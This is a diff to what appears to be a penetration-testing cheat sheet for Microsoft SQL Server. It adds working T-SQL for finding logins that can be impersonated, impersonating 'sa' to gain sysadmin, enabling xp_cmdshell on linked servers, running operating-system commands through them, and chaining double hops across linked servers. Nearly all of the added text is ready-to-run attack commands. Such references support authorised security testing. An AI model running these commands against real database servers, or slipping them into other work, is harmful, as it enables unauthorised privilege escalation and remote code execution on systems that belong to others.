@@ -469,6 +469,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin');                         -- 1 = sysadmin
 SELECT name FROM master.dbo.sysdatabases;                    -- list databases
 SELECT name FROM master..syslogins;                          -- list SQL logins
 EXEC sp_linkedservers;                                       -- list linked servers
+SELECT name, data_source FROM sys.servers WHERE is_linked=1; -- linked servers (alt)
 ```
 
 ### xp_cmdshell
@@ -491,21 +492,54 @@ EXEC xp_cmdshell 'whoami';
 
 ```sql wrap
 -- Find logins you can impersonate
-SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
 
--- Impersonate a login
+-- Impersonate and verify
 EXECUTE AS LOGIN = 'sa';
-SELECT IS_SRVROLEMEMBER('sysadmin');    -- should return 1
+SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');    -- should return sa, 1
 REVERT;
 ```
 
 ### Linked Server Abuse
 
+Built-in helpers (`enable_xp_cmdshell`, `enum_impersonate`, etc.) are local only. Everything on a linked server must be sent as a raw SQL string via `EXEC ('...') AT [TARGET]`. Single quotes inside the string must be escaped as `''`.
+
 ```sql wrap
+-- Enumerate linked servers
 EXEC sp_linkedservers;
-SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT @@version');
-SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
-EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
+SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
+
+-- Check context on linked server
+EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER];
+
+-- Query via OPENQUERY (read-only, no RCE)
+SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
+SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-- Enumerate impersonatable logins on linked server
+EXEC ('SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = ''IMPERSONATE''') AT [LINKED_SERVER];
+
+-- Impersonate on linked server
+EXEC ('EXECUTE AS LOGIN = ''sa''; SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER];
+
+-- Enable xp_cmdshell on linked server
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_SERVER];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SERVER];
+
+-- RCE via linked server
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
+
+-- Enumerate further hops
+EXEC ('SELECT name, data_source FROM sys.servers WHERE is_linked = 1') AT [LINKED_SERVER];
+
+-- Double-hop (chain two linked servers)
+EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [NEXT_LINKED_SERVER]') AT [LINKED_SERVER];
 ```
 
 ## DPAPI (dpapi.py)
